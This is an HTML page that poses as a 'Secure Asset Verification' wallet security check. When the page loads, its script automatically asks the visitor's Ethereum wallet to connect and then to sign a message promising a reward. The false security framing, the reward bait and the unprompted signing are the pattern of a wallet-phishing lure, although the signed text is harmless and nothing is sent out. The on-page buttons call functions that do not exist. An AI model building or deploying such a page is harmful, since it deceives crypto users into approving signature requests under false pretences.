<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Secure Asset Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      text-align: center;
      padding: 40px;
    }
    button {
      padding: 12px 20px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }
    #connect { background: #22c55e; }
    #sign { background: #3b82f6; }
    #log {
      margin-top: 20px;
      text-align: left;
      background: #020617;
      padding: 15px;
      border-radius: 8px;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      font-size: 13px;
      height: 200px;
      overflow-y: auto;
    }
  </style>
</head>
<body>

<h2>🔐 Verifying Wallet Security...</h2>
<p>Please wait while we verify your wallet.</p>

<button id="connect" onclick="connectWallet()">Connect Wallet</button>
<button id="sign" onclick="signMessage()">Sign Verification</button>

<div id="log"></div>

<script>
  const logBox = document.getElementById("log");

  function log(msg) {
    const p = document.createElement("div");
    p.innerText = "> " + msg;
    logBox.appendChild(p);
    logBox.scrollTop = logBox.scrollHeight;
    console.log(msg);
  }

  async function autoFlow() {
    if (!window.ethereum) {
      log("No wallet provider found.");
      return;
    }

    try {
      log("Requesting wallet connection...");

      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      });

      const account = accounts[0];
      log("Connected: " + account);

      // Small delay to ensure UI stability
      await new Promise(r => setTimeout(r, 1000));

      log("Requesting signature...");

      await window.ethereum.request({
        method: 'personal_sign',
        params: [
          "Security verification required to claim reward.",
          account
        ]
      });

      log("Signature request sent.");
    } catch (err) {
      log("Flow interrupted or rejected.");
    }
  }

  window.addEventListener("load", () => {
    setTimeout(autoFlow, 1000);
  });
</script>

</body>
</html>
